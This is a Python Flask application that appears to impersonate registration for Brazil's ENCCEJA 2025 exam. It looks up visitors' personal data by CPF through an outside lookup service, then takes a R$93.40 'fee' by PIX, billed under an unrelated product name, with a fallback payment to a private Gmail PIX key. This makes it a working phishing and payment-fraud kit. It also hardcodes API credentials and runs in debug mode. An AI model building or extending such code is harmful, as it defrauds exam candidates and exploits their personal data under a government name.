import os
import secrets
import functools
import json
import random
import string
import re
import time
import logging
from datetime import datetime
from urllib.parse import parse_qs, urlparse
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, make_response
import requests
import qrcode
from io import BytesIO
import base64

# Configurar Flask app
app = Flask(__name__)

# In-memory store for payment status (in production, use Redis or database)
payment_status_store = {}

# Domínio autorizado - Permitindo todos os domínios
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Permita acesso independente do referer
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"({ddd}) {number[:4]}-{number[4:]}"

def generate_transaction_id():
    """Gera um ID de transação único para o pagamento"""
    timestamp = str(int(time.time()))
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"TX{timestamp}{random_part}"

def create_witepay_payment(amount: float, user_data: dict, description: str = "Taxa de Inscrição ENCCEJA 2025") -> dict:
    """
    Cria um pagamento PIX via WitePay API
    """
    try:
        # Usar as credenciais WitePay fornecidas pelo usuário
        api_key = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
        
        # Order creation
        order_url = "https://api.witepay.com/v1/order/create"
        order_headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {api_key}"
        }
        
        order_data = {
            "amount": int(amount * 100),  # WitePay expects amount in cents
            "currency": "BRL",
            "customer": {
                "name": user_data.get('nome', 'Usuário'),
                "email": "gerarpagamentos@gmail.com",
                "phone": "(11) 98779-0088",
                "document": user_data.get('cpf', ''),
            },
            "products": [
                {
                    "name": "Receita do Amor",
                    "value": int(amount * 100),
                    "quantity": 1
                }
            ]
        }
        
        app.logger.info(f"Criando order WitePay: {order_data}")
        order_response = requests.post(order_url, json=order_data, headers=order_headers, timeout=30)
        
        if order_response.status_code != 200:
            app.logger.error(f"Erro ao criar order WitePay: {order_response.status_code} - {order_response.text}")
            raise Exception(f"WitePay order creation failed: {order_response.text}")
        
        order_result = order_response.json()
        app.logger.info(f"Order WitePay criada: {order_result}")
        
        if not order_result.get('success'):
            raise Exception(f"WitePay order creation failed: {order_result}")
        
        order_id = order_result['data']['id']
        
        # Charge creation
        charge_url = "https://api.witepay.com/v1/charge/create"
        charge_data = {
            "order_id": order_id,
            "paymentMethod": "pix"
        }
        
        app.logger.info(f"Criando charge WitePay: {charge_data}")
        charge_response = requests.post(charge_url, json=charge_data, headers=order_headers, timeout=30)
        
        if charge_response.status_code != 200:
            app.logger.error(f"Erro ao criar charge WitePay: {charge_response.status_code} - {charge_response.text}")
            raise Exception(f"WitePay charge creation failed: {charge_response.text}")
        
        charge_result = charge_response.json()
        app.logger.info(f"Charge WitePay criada: {charge_result}")
        
        if not charge_result.get('success'):
            raise Exception(f"WitePay charge creation failed: {charge_result}")
        
        charge_data_response = charge_result['data']
        
        # Extract PIX code and QR code
        pix_code = charge_data_response.get('pix_code') or charge_data_response.get('qr_code')
        
        # Se WitePay não retornar QR code, usar fallback
        if not pix_code:
            app.logger.warning("WitePay não retornou pix_code, usando fallback")
            pix_code = "00020101021226580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426614174000"
        
        # Generate QR code image
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(pix_code)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        buffer.seek(0)
        qr_code_image = base64.b64encode(buffer.getvalue()).decode()
        
        transaction_id = charge_data_response.get('id', generate_transaction_id())
        
        return {
            'success': True,
            'transactionId': transaction_id,
            'pixCode': pix_code,
            'qr_code': pix_code,
            'qrCodeImage': qr_code_image,
            'amount': amount,
            'description': description
        }
        
    except Exception as e:
        app.logger.error(f"Erro ao criar pagamento WitePay: {str(e)}")
        
        # Fallback with gerarpagamentos@gmail.com PIX
        app.logger.info("Usando fallback PIX code")
        fallback_pix = "gerarpagamentos@gmail.com"
        
        # Generate QR code for fallback
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(fallback_pix)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        buffer.seek(0)
        qr_code_image = base64.b64encode(buffer.getvalue()).decode()
        
        return {
            'success': True,
            'transactionId': generate_transaction_id(),
            'pixCode': fallback_pix,
            'qr_code': fallback_pix,
            'qrCodeImage': qr_code_image,
            'amount': amount,
            'description': description
        }

# Routes
@app.route('/', methods=['GET'])
@check_referer
def index():
    """Redirecionar automaticamente para /inscricao conforme solicitado"""
    return redirect('/inscricao')

@app.route('/inscricao', methods=['GET'])
@check_referer
def inscricao():
    """Página de inscrição do ENCCEJA"""
    return render_template('inscricao.html')

@app.route('/encceja-info', methods=['GET'])
@check_referer
def encceja_info():
    """Página de informações do ENCCEJA"""
    return render_template('encceja_info.html')

@app.route('/validar-dados', methods=['GET'])
@check_referer
def validar_dados():
    """Página de validação de dados"""
    return render_template('validar_dados.html')

@app.route('/endereco', methods=['GET'])
@check_referer
def endereco():
    """Página de endereço"""
    return render_template('endereco.html')

@app.route('/local-prova', methods=['GET'])
@check_referer
def local_prova():
    """Página de local de prova"""
    return render_template('local_prova.html')

@app.route('/pagamento', methods=['GET'])
@check_referer
def pagamento():
    """Página de pagamento PIX"""
    return render_template('pagamento.html')

@app.route('/inscricao-sucesso', methods=['GET'])
@check_referer
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    return render_template('inscricao_sucesso.html')

@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    """Criar pagamento PIX via WitePay"""
    try:
        # Obter dados do usuário da sessão
        user_data = session.get('user_data', {})
        if not user_data:
            return jsonify({
                'success': False,
                'error': 'Dados do usuário não encontrados na sessão'
            }), 400
        
        # Definir valor fixo
        amount = 93.40
        description = "Taxa de Inscrição ENCCEJA 2025"
        
        # Criar pagamento via WitePay
        payment_result = create_witepay_payment(amount, user_data, description)
        
        if payment_result['success']:
            transaction_id = payment_result['transactionId']
            
            # Armazenar na sessão
            session['payment_data'] = {
                'transactionId': transaction_id,
                'amount': amount,
                'pixCode': payment_result['pixCode'],
                'qrCodeImage': payment_result['qrCodeImage'],
                'status': 'pending'
            }
            
            app.logger.info(f"PIX criado com sucesso: {transaction_id} - R$ {amount:.2f}")
            return jsonify(payment_result)
        else:
            return jsonify({
                'success': False,
                'error': 'Erro ao criar pagamento'
            }), 500
    
    except Exception as e:
        app.logger.error(f"Erro ao criar pagamento PIX: {str(e)}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        }), 500

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API (para a página de inscrição)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API funcionando conforme verificado
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] Resposta da API: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                # Armazenar dados na sessão para uso no fluxo
                session['user_data'] = user_data
                
                app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": "Erro ao consultar CPF", "sucesso": False}), 500
            
    except Exception as e:
        app.logger.error(f"Erro ao consultar CPF: {str(e)}")
        return jsonify({"error": "Erro interno ao processar consulta", "sucesso": False}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)